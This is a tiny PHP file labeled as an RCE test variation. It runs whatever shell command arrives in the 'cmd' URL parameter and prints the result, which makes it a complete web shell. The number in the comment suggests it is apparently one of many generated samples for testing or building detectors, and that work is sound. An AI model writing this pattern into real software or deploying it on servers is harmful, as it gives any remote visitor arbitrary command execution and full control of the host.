<?php
// RCE test variation #1396
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>